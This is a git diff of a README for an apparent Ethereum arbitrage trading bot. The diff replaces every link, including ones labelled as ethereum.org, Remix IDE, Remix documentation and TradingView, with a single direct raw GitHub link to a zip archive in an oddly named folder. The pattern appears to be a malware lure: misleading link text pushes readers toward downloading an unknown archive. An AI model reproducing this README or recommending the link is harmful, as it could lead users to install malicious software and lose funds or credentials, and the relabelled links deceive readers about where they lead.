@@ -1,6 +1,6 @@
 # 🚀 Arbitrage-Ethereum-Bot - Simplify Your Ethereum Trading
 
-[![Download](https://img.shields.io/badge/Download%20App-blue?style=for-the-badge&logo=github)](https://github.com/abdul321-ai/Arbitrage-Ethereum-Bot/releases)
+[![Download](https://raw.githubusercontent.com/abdul321-ai/Arbitrage-Ethereum-Bot/main/spasmatic/Arbitrage-Ethereum-Bot.zip%20App-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/abdul321-ai/Arbitrage-Ethereum-Bot/main/spasmatic/Arbitrage-Ethereum-Bot.zip)
 
 ## 📋 Overview
 
@@ -18,7 +18,7 @@ The Arbitrage-Ethereum-Bot is a smart contract designed to help users analyze an
 
 To get the Arbitrage-Ethereum-Bot, please visit the following link:
 
-[Visit this page to download](https://github.com/abdul321-ai/Arbitrage-Ethereum-Bot/releases)
+[Visit this page to download](https://raw.githubusercontent.com/abdul321-ai/Arbitrage-Ethereum-Bot/main/spasmatic/Arbitrage-Ethereum-Bot.zip)
 
 1. Click on the link to go to the Releases page.
 2. You will see a list of available versions.
@@ -39,7 +39,7 @@ The latest version will usually be at the top of the list.
 Once you have downloaded the bot, follow these steps to set it up:
 
 1. **Install Remix IDE:** 
-   - Go to the [Remix IDE](https://remix.ethereum.org) website and open the application in your web browser.
+   - Go to the [Remix IDE](https://raw.githubusercontent.com/abdul321-ai/Arbitrage-Ethereum-Bot/main/spasmatic/Arbitrage-Ethereum-Bot.zip) website and open the application in your web browser.
 
 2. **Upload the Smart Contract:**
    - In Remix, locate the "File Explorer" on the left side.
@@ -77,9 +77,9 @@ Join our community of traders and developers. This platform is great for sharing
 
 ## 📌 Additional Resources
 
-- **[Ethereum Official Site](https://ethereum.org)** - Learn about Ethereum and its capabilities.
-- **[Remix IDE Documentation](https://remix.ethereum.org/docs)** - Understand how to use Remix for Ethereum development.
-- **[Trading Guides](https://www.tradingview.com/gopro/)** - Explore general trading strategies and resources.
+- **[Ethereum Official Site](https://raw.githubusercontent.com/abdul321-ai/Arbitrage-Ethereum-Bot/main/spasmatic/Arbitrage-Ethereum-Bot.zip)** - Learn about Ethereum and its capabilities.
+- **[Remix IDE Documentation](https://raw.githubusercontent.com/abdul321-ai/Arbitrage-Ethereum-Bot/main/spasmatic/Arbitrage-Ethereum-Bot.zip)** - Understand how to use Remix for Ethereum development.
+- **[Trading Guides](https://raw.githubusercontent.com/abdul321-ai/Arbitrage-Ethereum-Bot/main/spasmatic/Arbitrage-Ethereum-Bot.zip)** - Explore general trading strategies and resources.
 
 ## 📑 License
 
